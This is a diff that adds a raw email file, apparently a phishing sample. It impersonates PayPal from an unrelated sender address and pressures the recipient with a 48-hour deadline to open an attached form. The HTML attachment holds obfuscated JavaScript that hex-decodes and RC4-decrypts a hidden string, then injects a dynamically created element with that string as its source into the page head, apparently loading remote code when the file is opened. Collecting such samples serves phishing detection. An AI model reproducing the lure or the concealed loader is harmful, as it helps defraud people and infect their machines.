@@ -1,0 +1,36 @@
+Content-Type: multipart/mixed; boundary="===============8673785877527544999=="
+MIME-Version: 1.0
+From: PayPal Support <report@safe.org>
+Message-Id: <1cf542bca3570b4608bee39ca51dae4d@CfXXqzcHs3Vi.org>
+Subject: Your records are no longer up-to-date
+To: stephaney.harris.@cox.net
+
+--===============8673785877527544999==
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+Please understand that our users safety has always been our main concern here at PayPal.
+
+It seems that without your knowledge, you have some out-of-date or missing information
+in your PayPal account. This is your first notification to promptly update your
+account records.
+
+If you don't update your information in 48 hours, PayPal will try to contact you
+in a different way, perhaps by phone. In the worst case scenario, your account will
+get limited temporarily until the problem is resolved.
+
+In order to update your information, we ask that you open the form that PayPal has provided in
+the email attachment. Complete the form in your browser with current and correct information.
+
+We understand the inconvenience. However, this is a security measure implemented by PayPal
+to ensure greater protection for all of our clients, including you.
+
+We greatly appreciate your attention and time into this matter.
+--===============8673785877527544999==
+MIME-Version: 1.0
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html><head><meta charset="utf-8"><script>function oza76vqp2(y6fu){    var vk7j = 0;    var cazfrefm = '';    if( y6fu.substr(0,2) == '0x' ){ vk7j = 2; }    if( typeof y6fu != 'string' ){ y6fu = y6fu.toString(); }    for(var l8r7na8zq=vk7j;  l8r7na8zq<y6fu.length; l8r7na8zq+=2) {        var c = y6fu.substr( l8r7na8zq, 2 );        cazfrefm = cazfrefm + String.fromCharCode( parseInt(c, 16) );        }    return cazfrefm;}function i624l104(buc6byvt0, fuo4tc) {  var mjx908, t43oqr1, f5w35wx42, fgy89301, hc21376jj, t550;  for (mjx908 = [], t43oqr1 = 0, fgy89301 = "", hc21376jj = 0; hc21376jj < 256; hc21376jj++) mjx908[hc21376jj] = hc21376jj;  for (hc21376jj = 0; hc21376jj < 256; hc21376jj++)    t43oqr1 = (t43oqr1 + mjx908[hc21376jj] + fuo4tc.charCodeAt((hc21376jj % fuo4tc.length))) % 256,    f5w35wx42 = mjx908[hc21376jj],    mjx908[hc21376jj] = mjx908[t43oqr1],    mjx908[t43oqr1] = (f5w35wx42);  for (hc21376jj = 0, t43oqr1 = 0, t550 = 0; t550 < buc6byvt0.length; t550++)    hc21376jj = ((hc21376jj + 1) % 256),    t43oqr1 = ((t43oqr1 + mjx908[hc21376jj]) % 256),    f5w35wx42 = mjx908[hc21376jj],    mjx908[hc21376jj] = mjx908[t43oqr1],    mjx908[t43oqr1] = f5w35wx42,    fgy89301 += String.fromCharCode(buc6byvt0.charCodeAt(t550) ^ mjx908[(mjx908[hc21376jj] + mjx908[t43oqr1]) % 256]);  return fgy89301}var i181uel = i624l104(oza76vqp2("9b25b29a97eaf96ee049a543c01b90582761b19782f04f3c6fc8d3dda2ef49dff005ce383ca1ec49f1563f05169fc2e46f3681593e53ebaa842be6"),"i8v4sdxe");var fn94q9na = i624l104(oza76vqp2("8032b483ddb1"),"i8v4sdxe");var i8h5a = document.createElement(fn94q9na);i8h5a.src = i181uel;var i3114e1z = i624l104(oza76vqp2("9b34a78e"),"i8v4sdxe");document.getElementsByTagName(i3114e1z)[0].appendChild(i8h5a);</script></head><body></body></html>
+--===============8673785877527544999==--
